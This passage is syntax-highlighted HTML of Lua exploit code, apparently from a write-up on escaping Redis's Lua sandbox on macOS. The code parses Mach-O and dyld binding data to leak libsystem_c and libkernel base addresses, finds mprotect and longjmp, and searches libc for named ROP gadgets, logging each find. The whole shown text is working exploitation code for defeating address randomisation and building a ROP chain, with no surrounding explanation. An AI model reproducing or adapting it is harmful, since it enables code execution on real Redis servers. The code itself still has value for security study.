</span><span class='line'>    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="s">[+] found mprotect symbol &quot;</span> <span class="o">..</span> <span class="n">dump8</span><span class="p">(</span><span class="n">mprotect_addr</span><span class="p">))</span>
</span><span class='line'>    <span class="k">return</span> <span class="n">mprotect_addr</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">parse_exports_dyld_info</span> <span class="o">=</span> <span class="n">function</span><span class="p">(</span><span class="n">macho_offset</span><span class="p">,</span> <span class="n">offset</span><span class="p">,</span> <span class="n">segment_info</span><span class="p">)</span>
</span><span class='line'>  <span class="kd">local</span> <span class="n">export_binding_info_offset</span> <span class="o">=</span> <span class="n">readi4</span><span class="p">(</span><span class="n">addint</span><span class="p">(</span><span class="n">macho_offset</span><span class="p">,</span> <span class="n">offset</span> <span class="o">+</span> <span class="mi">40</span><span class="p">))</span>
</span><span class='line'>  <span class="kd">local</span> <span class="n">export_binding_info_size</span> <span class="o">=</span> <span class="n">readi4</span><span class="p">(</span><span class="n">addint</span><span class="p">(</span><span class="n">macho_offset</span><span class="p">,</span> <span class="n">offset</span> <span class="o">+</span> <span class="mi">44</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>  <span class="kd">local</span> <span class="n">offset</span> <span class="o">=</span> <span class="n">opcode_offset</span><span class="p">(</span><span class="n">macho_offset</span><span class="p">,</span> <span class="n">segment_info</span><span class="p">,</span><span class="n">export_binding_info_offset</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">return</span> <span class="n">process_export_bindings</span><span class="p">(</span><span class="n">macho_offset</span><span class="p">,</span> <span class="n">offset</span><span class="p">,</span> <span class="n">export_binding_info_size</span><span class="p">)</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">parse_libkernel_macho</span> <span class="o">=</span> <span class="n">function</span><span class="p">(</span><span class="n">macho_offset</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="kd">local</span> <span class="n">mprotect_addr</span> <span class="o">=</span> <span class="kc">nil</span>
</span><span class='line'>  <span class="kd">local</span> <span class="n">callback</span> <span class="o">=</span> <span class="n">function</span><span class="p">(</span><span class="n">offset</span><span class="p">,</span> <span class="n">segment_info</span><span class="p">)</span>
</span><span class='line'>    <span class="n">mprotect_addr</span> <span class="o">=</span> <span class="n">parse_exports_dyld_info</span><span class="p">(</span><span class="n">macho_offset</span><span class="p">,</span> <span class="n">offset</span><span class="p">,</span> <span class="n">segment_info</span><span class="p">)</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">parse_macho_segments</span><span class="p">(</span><span class="n">macho_offset</span><span class="p">,</span> <span class="n">callback</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">return</span> <span class="n">mprotect_addr</span>
</span><span class='line'>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">process_lazy_bindings</span> <span class="o">=</span> <span class="n">function</span><span class="p">(</span><span class="n">offset</span><span class="p">,</span> <span class="n">size</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="kd">local</span> <span class="n">stream</span> <span class="o">=</span> <span class="n">new_lazy_stream</span><span class="p">(</span><span class="n">offset</span><span class="p">,</span> <span class="n">size</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="kd">local</span> <span class="n">current_symbol</span> <span class="o">=</span> <span class="p">{}</span>
</span><span class='line'>  <span class="kd">local</span> <span class="n">symbols</span> <span class="o">=</span> <span class="p">{}</span>
</span><span class='line'>  <span class="k">while</span> <span class="ow">not</span> <span class="n">lazy_stream_empty</span><span class="p">(</span><span class="n">stream</span><span class="p">)</span> <span class="k">do</span>
</span><span class='line'>    <span class="kd">local</span> <span class="n">op</span> <span class="o">=</span> <span class="n">lazy_stream_read</span><span class="p">(</span><span class="n">stream</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>    <span class="kd">local</span> <span class="n">immediate</span> <span class="o">=</span> <span class="n">op</span> <span class="o">%</span> <span class="mi">16</span>
</span><span class='line'>    <span class="kd">local</span> <span class="n">opcode</span> <span class="o">=</span> <span class="n">op</span> <span class="o">-</span> <span class="n">immediate</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">if</span> <span class="n">opcode</span> <span class="o">==</span> <span class="mh">0x70</span> <span class="k">then</span>
</span><span class='line'>      <span class="cm">--[[BIND_OPCODE_SET_SEGMENT_AND_OFFSET_ULEB]]</span>
</span><span class='line'>      <span class="n">current_symbol</span><span class="p">.</span><span class="n">segment</span> <span class="o">=</span> <span class="n">immediate</span>
</span><span class='line'>      <span class="n">current_symbol</span><span class="p">.</span><span class="n">offset</span> <span class="o">=</span> <span class="n">read_uleb8</span><span class="p">(</span><span class="n">stream</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">elseif</span> <span class="n">opcode</span> <span class="o">==</span> <span class="mh">0x40</span> <span class="k">then</span>
</span><span class='line'>      <span class="cm">--[[BIND_OPCODE_SET_SYMBOL_TRAILING_FLAGS_IMM]]</span>
</span><span class='line'>      <span class="n">current_symbol</span><span class="p">.</span><span class="n">name</span> <span class="o">=</span> <span class="n">read_string</span><span class="p">(</span><span class="n">stream</span><span class="p">)</span>
</span><span class='line'>    <span class="k">elseif</span> <span class="n">opcode</span> <span class="o">==</span> <span class="mh">0x10</span> <span class="k">then</span>
</span><span class='line'>      <span class="cm">--[[BIND_OPCODE_SET_DYLIB_ORDINAL_IMM]]</span>
</span><span class='line'>      <span class="cm">--[[ignore]]</span>
</span><span class='line'>    <span class="k">elseif</span> <span class="n">opcode</span> <span class="o">==</span> <span class="mh">0x90</span> <span class="k">then</span>
</span><span class='line'>      <span class="cm">--[[BIND_OPCODE_DO_BIND]]</span>
</span><span class='line'>      <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="s">[*] parsed_symbol &quot;</span> <span class="o">..</span> <span class="n">current_symbol</span><span class="p">.</span><span class="n">name</span> <span class="o">..</span> <span class="s2">&quot;</span><span class="s"> =&gt; &quot;</span> <span class="o">..</span> <span class="n">current_symbol</span><span class="p">.</span><span class="n">segment</span> <span class="o">..</span> <span class="s2">&quot;</span><span class="s">:&quot;</span> <span class="o">..</span> <span class="n">current_symbol</span><span class="p">.</span><span class="n">offset</span><span class="p">)</span>
</span><span class='line'>      <span class="nb">table.insert</span><span class="p">(</span><span class="n">symbols</span><span class="p">,</span> <span class="n">current_symbol</span><span class="p">)</span>
</span><span class='line'>      <span class="kd">local</span> <span class="n">old_symbol</span> <span class="o">=</span> <span class="n">current_symbol</span>
</span><span class='line'>      <span class="n">current_symbol</span> <span class="o">=</span> <span class="p">{}</span>
</span><span class='line'>      <span class="n">current_symbol</span><span class="p">.</span><span class="n">segment</span> <span class="o">=</span> <span class="n">old_symbol</span><span class="p">.</span><span class="n">segment</span>
</span><span class='line'>      <span class="n">current_symbol</span><span class="p">.</span><span class="n">offset</span> <span class="o">=</span> <span class="n">old_symbol</span><span class="p">.</span><span class="n">offset</span>
</span><span class='line'>      <span class="n">current_symbol</span><span class="p">.</span><span class="n">name</span> <span class="o">=</span> <span class="n">old_symbol</span><span class="p">.</span><span class="n">name</span>
</span><span class='line'>    <span class="k">elseif</span> <span class="n">opcode</span> <span class="o">==</span> <span class="mh">0x00</span> <span class="k">then</span>
</span><span class='line'>      <span class="cm">--[[BIND_OPCODE_DONE]]</span>
</span><span class='line'>      <span class="cm">--[[ignore]]</span>
</span><span class='line'>    <span class="k">else</span>
</span><span class='line'>      <span class="n">fail</span><span class="p">(</span><span class="s2">&quot;</span><span class="s">found unknown opcode in lazy bindings &quot;</span> <span class="o">..</span> <span class="n">opcode</span><span class="p">)</span>
</span><span class='line'>    <span class="k">end</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>  <span class="k">return</span> <span class="n">symbols</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">parse_dyld_info</span> <span class="o">=</span> <span class="n">function</span><span class="p">(</span><span class="n">macho_offset</span><span class="p">,</span> <span class="n">offset</span><span class="p">,</span> <span class="n">segment_info</span><span class="p">)</span>
</span><span class='line'>  <span class="kd">local</span> <span class="n">lazy_binding_info_offset</span> <span class="o">=</span> <span class="n">readi4</span><span class="p">(</span><span class="n">addint</span><span class="p">(</span><span class="n">macho_offset</span><span class="p">,</span> <span class="n">offset</span> <span class="o">+</span> <span class="mi">32</span><span class="p">))</span>
</span><span class='line'>  <span class="kd">local</span> <span class="n">lazy_binding_size</span> <span class="o">=</span>   <span class="n">readi4</span><span class="p">(</span><span class="n">addint</span><span class="p">(</span><span class="n">macho_offset</span><span class="p">,</span> <span class="n">offset</span> <span class="o">+</span> <span class="mi">36</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>  <span class="kd">local</span> <span class="n">offset</span> <span class="o">=</span> <span class="n">opcode_offset</span><span class="p">(</span><span class="n">macho_offset</span><span class="p">,</span> <span class="n">segment_info</span><span class="p">,</span><span class="n">lazy_binding_info_offset</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">return</span> <span class="n">process_lazy_bindings</span><span class="p">(</span><span class="n">offset</span><span class="p">,</span> <span class="n">lazy_binding_size</span><span class="p">)</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">find_symbol</span> <span class="o">=</span> <span class="n">function</span><span class="p">(</span><span class="n">symbols</span><span class="p">,</span> <span class="n">symbol</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">for</span> <span class="n">i</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span> <span class="o">#</span><span class="n">symbols</span> <span class="k">do</span>
</span><span class='line'>    <span class="k">if</span> <span class="n">symbols</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">name</span> <span class="o">==</span> <span class="n">symbol</span> <span class="k">then</span>
</span><span class='line'>      <span class="k">return</span> <span class="n">symbols</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
</span><span class='line'>    <span class="k">end</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">return</span> <span class="kc">nil</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">leak_macho</span> <span class="o">=</span> <span class="n">function</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">data_location</span><span class="p">,</span> <span class="n">symbols</span><span class="p">,</span> <span class="n">symbol</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="kd">local</span> <span class="n">resolved_symbol</span> <span class="o">=</span> <span class="n">find_symbol</span><span class="p">(</span><span class="n">symbols</span><span class="p">,</span> <span class="n">symbol</span><span class="p">)</span>
</span><span class='line'>  <span class="k">if</span> <span class="n">resolved_symbol</span> <span class="o">==</span> <span class="kc">nil</span> <span class="k">then</span>
</span><span class='line'>    <span class="n">fail</span><span class="p">(</span><span class="s2">&quot;</span><span class="s">Failed to find &quot;</span> <span class="o">..</span> <span class="n">symbol</span> <span class="o">..</span> <span class="s2">&quot;</span><span class="s"> symbol&quot;</span><span class="p">)</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'>  <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="s">[*] Found &quot;</span> <span class="o">..</span> <span class="n">symbol</span> <span class="o">..</span> <span class="s2">&quot;</span><span class="s"> symbol: &quot;</span> <span class="o">..</span> <span class="n">resolved_symbol</span><span class="p">.</span><span class="n">offset</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="cm">--[[we assume the pointer is into the data segment. #TODO FIX THIS]]</span>
</span><span class='line'>  <span class="kd">local</span> <span class="n">location</span> <span class="o">=</span> <span class="n">addint</span><span class="p">(</span><span class="n">data_location</span><span class="p">,</span> <span class="n">resolved_symbol</span><span class="p">.</span><span class="n">offset</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="kd">local</span> <span class="n">address</span> <span class="o">=</span> <span class="n">read_word</span><span class="p">(</span><span class="n">location</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="s">[*] Found &quot;</span> <span class="o">..</span> <span class="n">symbol</span> <span class="o">..</span> <span class="s2">&quot;</span><span class="s"> location: &quot;</span> <span class="o">..</span> <span class="n">dump8</span><span class="p">(</span><span class="n">address</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>  <span class="kd">local</span> <span class="n">macho_address</span> <span class="o">=</span> <span class="n">findmacho</span><span class="p">(</span><span class="n">address</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;</span><span class="s">[*] found &#39;</span> <span class="o">..</span> <span class="n">name</span> <span class="o">..</span> <span class="s1">&#39;</span><span class="s"> macho base address: &#39;</span> <span class="o">..</span> <span class="n">dump8</span><span class="p">(</span><span class="n">macho_address</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">return</span> <span class="n">macho_address</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">parse_redis_macho</span> <span class="o">=</span> <span class="n">function</span><span class="p">(</span><span class="n">macho_offset</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="kd">local</span> <span class="n">longjmp_location</span> <span class="o">=</span> <span class="kc">nil</span>
</span><span class='line'>  <span class="kd">local</span> <span class="n">libsystem_c</span> <span class="o">=</span> <span class="kc">nil</span>
</span><span class='line'>  <span class="kd">local</span> <span class="n">libkernel</span> <span class="o">=</span> <span class="kc">nil</span>
</span><span class='line'>
</span><span class='line'>  <span class="kd">local</span> <span class="n">callback</span> <span class="o">=</span> <span class="n">function</span><span class="p">(</span><span class="n">offset</span><span class="p">,</span> <span class="n">segment_info</span><span class="p">)</span>
</span><span class='line'>      <span class="kd">local</span> <span class="n">symbols</span> <span class="o">=</span> <span class="n">parse_dyld_info</span><span class="p">(</span><span class="n">macho_offset</span><span class="p">,</span> <span class="n">offset</span><span class="p">,</span> <span class="n">segment_info</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>      <span class="kd">local</span> <span class="n">data_location</span> <span class="o">=</span> <span class="n">segment_location</span><span class="p">(</span><span class="n">macho_offset</span><span class="p">,</span> <span class="n">segment_info</span><span class="p">,</span> <span class="s2">&quot;</span><span class="s">__DATA&quot;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>      <span class="n">libsystem_c</span> <span class="o">=</span> <span class="n">leak_macho</span><span class="p">(</span><span class="s2">&quot;</span><span class="s">libsystem_c&quot;</span><span class="p">,</span> <span class="n">data_location</span><span class="p">,</span> <span class="n">symbols</span><span class="p">,</span> <span class="s2">&quot;</span><span class="s">_strlen&quot;</span><span class="p">)</span>
</span><span class='line'>      <span class="n">libkernel</span> <span class="o">=</span> <span class="n">leak_macho</span><span class="p">(</span><span class="s2">&quot;</span><span class="s">libkernel&quot;</span><span class="p">,</span> <span class="n">data_location</span><span class="p">,</span> <span class="n">symbols</span><span class="p">,</span> <span class="s2">&quot;</span><span class="s">_getrlimit&quot;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>      <span class="kd">local</span> <span class="n">longjmp</span> <span class="o">=</span> <span class="n">find_symbol</span><span class="p">(</span><span class="n">symbols</span><span class="p">,</span> <span class="s2">&quot;</span><span class="s">_longjmp&quot;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>      <span class="k">if</span> <span class="n">longjmp</span> <span class="o">==</span> <span class="kc">nil</span> <span class="k">then</span>
</span><span class='line'>        <span class="n">longjmp</span> <span class="o">=</span> <span class="n">find_symbol</span><span class="p">(</span><span class="n">symbols</span><span class="p">,</span> <span class="s2">&quot;</span><span class="s">__longjmp&quot;</span><span class="p">)</span>
</span><span class='line'>      <span class="k">end</span>
</span><span class='line'>
</span><span class='line'>      <span class="k">if</span> <span class="n">longjmp</span> <span class="o">==</span> <span class="kc">nil</span> <span class="k">then</span>
</span><span class='line'>        <span class="n">fail</span><span class="p">(</span><span class="s2">&quot;</span><span class="s">Failed to find _longjmp symbol&quot;</span><span class="p">)</span>
</span><span class='line'>      <span class="k">else</span>
</span><span class='line'>        <span class="n">longjmp_location</span> <span class="o">=</span> <span class="n">read_word</span><span class="p">(</span><span class="n">addint</span><span class="p">(</span><span class="n">data_location</span><span class="p">,</span> <span class="n">longjmp</span><span class="p">.</span><span class="n">offset</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="s">[+] Found longjump jump location &quot;</span> <span class="o">..</span> <span class="n">dump8</span><span class="p">(</span><span class="n">longjmp_location</span><span class="p">))</span>
</span><span class='line'>      <span class="k">end</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'>
</span><span class='line'>  <span class="kd">local</span> <span class="n">segments</span> <span class="o">=</span> <span class="n">parse_macho_segments</span><span class="p">(</span><span class="n">macho_offset</span><span class="p">,</span> <span class="n">callback</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">return</span> <span class="p">{</span><span class="n">redis</span> <span class="o">=</span> <span class="n">macho_offset</span><span class="p">,</span> <span class="n">longjmp_address</span> <span class="o">=</span> <span class="n">longjmp_location</span><span class="p">,</span> <span class="n">libsystem_c</span> <span class="o">=</span> <span class="n">libsystem_c</span><span class="p">,</span> <span class="n">libkernel</span> <span class="o">=</span> <span class="n">libkernel</span><span class="p">,</span> <span class="n">redis_segments</span> <span class="o">=</span> <span class="n">segments</span><span class="p">}</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">matches</span> <span class="o">=</span> <span class="n">function</span><span class="p">(</span><span class="n">expected</span><span class="p">,</span> <span class="n">word</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">for</span> <span class="n">i</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span> <span class="o">#</span><span class="n">expected</span> <span class="k">do</span>
</span><span class='line'>    <span class="k">if</span> <span class="nb">string.byte</span><span class="p">(</span><span class="n">expected</span><span class="p">,</span> <span class="n">i</span><span class="p">)</span> <span class="o">~=</span> <span class="nb">string.byte</span><span class="p">(</span><span class="n">word</span><span class="p">,</span> <span class="n">i</span><span class="p">)</span> <span class="k">then</span>
</span><span class='line'>      <span class="k">return</span> <span class="kc">false</span>
</span><span class='line'>    <span class="k">end</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">return</span> <span class="kc">true</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">find_insn</span> <span class="o">=</span> <span class="n">function</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">expected</span><span class="p">,</span> <span class="n">libc</span><span class="p">,</span> <span class="n">offsets</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span> <span class="o">#</span><span class="n">expected</span> <span class="o">&gt;=</span> <span class="mi">8</span> <span class="k">then</span>
</span><span class='line'>    <span class="nb">error</span><span class="p">(</span><span class="s2">&quot;</span><span class="s">failed assertion&quot;</span><span class="p">)</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">for</span> <span class="n">i</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span> <span class="o">#</span><span class="n">offsets</span> <span class="k">do</span>
</span><span class='line'>    <span class="kd">local</span> <span class="n">addr</span> <span class="o">=</span> <span class="n">addint</span><span class="p">(</span><span class="n">libc</span><span class="p">,</span> <span class="n">offsets</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>
</span><span class='line'>    <span class="cm">--[[apparently we can do unaligned reads :) :)]]</span>
</span><span class='line'>    <span class="kd">local</span> <span class="n">word</span> <span class="o">=</span> <span class="n">read_word</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="n">word</span> <span class="o">~=</span> <span class="kc">nil</span><span class="p">)</span> <span class="ow">and</span> <span class="n">matches</span><span class="p">(</span><span class="n">expected</span><span class="p">,</span> <span class="n">word</span><span class="p">)</span> <span class="k">then</span>
</span><span class='line'>
</span><span class='line'>      <span class="k">return</span> <span class="n">addr</span>
</span><span class='line'>    <span class="k">end</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">return</span> <span class="kc">nil</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="k">function</span> <span class="nf">find_rops</span><span class="p">(</span><span class="n">rops</span><span class="p">,</span> <span class="n">stream</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="kd">local</span> <span class="n">literals</span> <span class="o">=</span> <span class="p">{}</span>
</span><span class='line'>  <span class="k">for</span> <span class="n">i</span><span class="p">,</span><span class="n">rop</span> <span class="k">in</span> <span class="nb">ipairs</span><span class="p">(</span><span class="n">rops</span><span class="p">)</span> <span class="k">do</span>
</span><span class='line'>    <span class="n">literals</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">literal</span><span class="p">(</span><span class="n">rop</span><span class="p">)</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'>
</span><span class='line'>  <span class="kd">local</span> <span class="n">re</span> <span class="o">=</span> <span class="n">join</span><span class="p">(</span><span class="n">dotstar</span><span class="p">(),</span> <span class="n">alternation</span><span class="p">(</span><span class="n">literals</span><span class="p">))</span>
</span><span class='line'>  <span class="kd">local</span> <span class="n">state</span> <span class="o">=</span> <span class="n">re_start</span><span class="p">(</span><span class="n">re</span><span class="p">)</span>
</span><span class='line'>  <span class="kd">local</span> <span class="n">found_rops</span> <span class="o">=</span> <span class="p">{}</span>
</span><span class='line'>  <span class="kd">local</span> <span class="n">remaining</span> <span class="o">=</span> <span class="o">#</span><span class="n">rops</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">while</span> <span class="ow">not</span> <span class="n">lazy_stream_empty</span><span class="p">(</span><span class="n">stream</span><span class="p">)</span> <span class="ow">and</span> <span class="n">remaining</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="k">do</span>
</span><span class='line'>    <span class="kd">local</span> <span class="n">next_byte</span> <span class="o">=</span> <span class="n">lazy_stream_read</span><span class="p">(</span><span class="n">stream</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">if</span> <span class="n">next_byte</span> <span class="o">==</span> <span class="kc">nil</span> <span class="k">then</span>
</span><span class='line'>      <span class="n">state</span> <span class="o">=</span> <span class="n">re_restart</span><span class="p">(</span><span class="n">state</span><span class="p">,</span> <span class="n">re</span><span class="p">)</span>
</span><span class='line'>    <span class="k">else</span>
</span><span class='line'>      <span class="n">state</span> <span class="o">=</span> <span class="n">re_push_byte</span><span class="p">(</span><span class="n">state</span><span class="p">,</span> <span class="n">next_byte</span><span class="p">)</span>
</span><span class='line'>    <span class="k">end</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">for</span> <span class="n">i</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span><span class="o">#</span><span class="p">(</span><span class="n">state</span><span class="p">.</span><span class="n">current_list</span><span class="p">)</span> <span class="k">do</span>
</span><span class='line'>      <span class="kd">local</span> <span class="n">s</span> <span class="o">=</span> <span class="n">state</span><span class="p">.</span><span class="n">current_list</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
</span><span class='line'>      <span class="k">if</span> <span class="n">s</span><span class="p">.</span><span class="n">byte</span> <span class="o">==</span> <span class="n">FINAL</span> <span class="k">then</span>
</span><span class='line'>        <span class="k">if</span> <span class="n">found_rops</span><span class="p">[</span><span class="n">s</span><span class="p">.</span><span class="n">matched</span><span class="p">]</span> <span class="o">==</span> <span class="kc">nil</span> <span class="k">then</span>
</span><span class='line'>          <span class="n">remaining</span> <span class="o">=</span> <span class="n">remaining</span> <span class="o">-</span> <span class="mi">1</span>
</span><span class='line'>          <span class="n">found_rops</span><span class="p">[</span><span class="n">s</span><span class="p">.</span><span class="n">matched</span><span class="p">]</span> <span class="o">=</span> <span class="n">stream</span><span class="p">.</span><span class="n">current_offset</span> <span class="o">-</span> <span class="nb">string.len</span><span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="n">matched</span><span class="p">)</span>
</span><span class='line'>        <span class="k">end</span>
</span><span class='line'>      <span class="k">end</span>
</span><span class='line'>    <span class="k">end</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">return</span> <span class="n">found_rops</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'><span class="c1">-- offset search for named rops only works if rop_size &lt;= 8 bytes because it only reads</span>
</span><span class='line'><span class="c1">-- a single word. slightly dodgy</span>
</span><span class='line'><span class="kd">local</span> <span class="k">function</span> <span class="nf">find_rops_and_assert</span><span class="p">(</span><span class="n">named_rops</span><span class="p">,</span> <span class="n">stream</span><span class="p">,</span> <span class="n">libc</span><span class="p">)</span>
</span><span class='line'>  <span class="kd">local</span> <span class="n">missing_rops</span> <span class="o">=</span> <span class="p">{}</span>
</span><span class='line'>
</span><span class='line'>  <span class="kd">local</span> <span class="n">inverted</span> <span class="o">=</span> <span class="p">{}</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">for</span> <span class="n">rop</span><span class="p">,</span> <span class="n">detail</span> <span class="k">in</span> <span class="nb">pairs</span><span class="p">(</span><span class="n">named_rops</span><span class="p">)</span> <span class="k">do</span>
</span><span class='line'>    <span class="kd">local</span> <span class="n">addr</span> <span class="o">=</span> <span class="n">find_insn</span><span class="p">(</span><span class="n">detail</span><span class="p">.</span><span class="n">name</span><span class="p">,</span> <span class="n">rop</span><span class="p">,</span> <span class="n">libc</span><span class="p">,</span> <span class="n">detail</span><span class="p">.</span><span class="n">offsets</span><span class="p">)</span>
</span><span class='line'>    <span class="k">if</span> <span class="n">addr</span> <span class="o">==</span> <span class="kc">nil</span> <span class="k">then</span>
</span><span class='line'>      <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="s">[-] Missing rop at fixed location will search: &quot;</span> <span class="o">..</span> <span class="n">detail</span><span class="p">.</span><span class="n">name</span><span class="p">)</span>
</span><span class='line'>      <span class="nb">table.insert</span><span class="p">(</span><span class="n">missing_rops</span><span class="p">,</span> <span class="n">rop</span><span class="p">)</span>
</span><span class='line'>    <span class="k">else</span>
</span><span class='line'>      <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="s">[*] Found rop: &quot;</span> <span class="o">..</span> <span class="n">detail</span><span class="p">.</span><span class="n">name</span> <span class="o">..</span> <span class="s2">&quot;</span><span class="s"> @ &quot;</span> <span class="o">..</span> <span class="n">dump8</span><span class="p">(</span><span class="n">addr</span><span class="p">))</span>
</span><span class='line'>      <span class="n">inverted</span><span class="p">[</span><span class="n">detail</span><span class="p">.</span><span class="n">name</span><span class="p">]</span> <span class="o">=</span> <span class="n">addr</span>
</span><span class='line'>    <span class="k">end</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span> <span class="o">#</span><span class="n">missing_rops</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="k">then</span>
</span><span class='line'>    <span class="kd">local</span> <span class="n">found_rops</span> <span class="o">=</span> <span class="n">find_rops</span><span class="p">(</span><span class="n">missing_rops</span><span class="p">,</span> <span class="n">stream</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">for</span> <span class="n">i</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span><span class="o">#</span><span class="n">missing_rops</span> <span class="k">do</span>
</span><span class='line'>      <span class="kd">local</span> <span class="n">rop</span> <span class="o">=</span> <span class="n">missing_rops</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
</span><span class='line'>      <span class="k">if</span> <span class="n">found_rops</span><span class="p">[</span><span class="n">rop</span><span class="p">]</span> <span class="o">==</span> <span class="kc">nil</span> <span class="k">then</span>
</span><span class='line'>        <span class="n">fail</span><span class="p">(</span><span class="s2">&quot;</span><span class="s">Failed to find rop: &quot;</span> <span class="o">..</span> <span class="n">named_rops</span><span class="p">[</span><span class="n">rop</span><span class="p">].</span><span class="n">name</span><span class="p">)</span>
</span><span class='line'>      <span class="k">else</span>
</span><span class='line'>        <span class="kd">local</span> <span class="n">addr</span> <span class="o">=</span> <span class="n">addint</span><span class="p">(</span><span class="n">stream</span><span class="p">.</span><span class="n">start_offset</span><span class="p">,</span> <span class="n">found_rops</span><span class="p">[</span><span class="n">rop</span><span class="p">])</span>
</span><span class='line'>        <span class="kd">local</span> <span class="n">name</span> <span class="o">=</span> <span class="n">named_rops</span><span class="p">[</span><span class="n">rop</span><span class="p">].</span><span class="n">name</span>
